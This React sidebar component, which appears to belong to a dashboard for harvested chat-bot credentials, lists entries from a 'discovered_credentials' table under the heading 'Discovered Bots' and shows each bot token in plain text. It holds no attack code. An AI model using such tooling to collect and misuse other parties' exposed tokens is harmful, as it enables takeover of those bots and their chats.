"use client";

import { useEffect, useState } from "react";
import { supabase } from "@/lib/supabase";
import { LucideTarget } from "lucide-react";

export default function Sidebar({
    selectedId,
    onSelect,
}: {
    selectedId: string | null;
    onSelect: (id: string) => void;
}) {
    const [credentials, setCredentials] = useState<any[]>([]);

    useEffect(() => {
        async function fetchCreds() {
            // Fetch all credentials
            const { data, error } = await supabase
                .from("discovered_credentials")
                .select("*")
                .order("created_at", { ascending: false });

            if (data) setCredentials(data);
        }

        fetchCreds();

        // Realtime subscription
        const channel = supabase
            .channel('schema-db-changes')
            .on(
                'postgres_changes',
                {
                    event: 'INSERT',
                    schema: 'public',
                    table: 'discovered_credentials',
                },
                (payload) => {
                    setCredentials((prev) => [payload.new, ...prev]);
                }
            )
            .subscribe()

        return () => {
            supabase.removeChannel(channel);
        }
    }, []);

    return (
        <div className="w-1/3 border-r h-full flex flex-col bg-slate-50 overflow-y-auto">
            <div className="p-4 border-b bg-white sticky top-0 z-10">
                <h2 className="font-bold text-lg flex items-center gap-2 text-slate-800">
                    <LucideTarget className="text-red-600" /> Discovered Bots
                </h2>
            </div>
            <div className="flex flex-col">
                {credentials.map((cred) => (
                    <button
                        key={cred.id}
                        onClick={() => onSelect(cred.id)}
                        className={`p-4 border-b text-left hover:bg-slate-100 transition-colors ${selectedId === cred.id ? "bg-blue-50 border-l-4 border-l-blue-500" : ""
                            }`}
                    >
                        <div className="flex justify-between w-full mb-1">
                            <span className="font-semibold text-slate-800 truncate">
                                {cred.meta?.bot_username
                                    ? `@${cred.meta.bot_username} / ${cred.meta.bot_id || '?'}`
                                    : (cred.meta?.chat_title || "Unknown Chat")}
                            </span>
                            <span className="text-xs text-slate-400">
                                {new Date(cred.created_at).toLocaleDateString()}
                            </span>
                        </div>
                        <div className="text-sm text-slate-500 truncate flex items-center gap-1">
                            <span className="bg-slate-200 px-1 py-0.5 rounded text-[10px] uppercase font-mono">{cred.source}</span>
                            <span className="font-mono text-xs opacity-70 truncate">{cred.bot_token}</span>
                        </div>
                    </button>
                ))}
            </div>
        </div>
    );
}
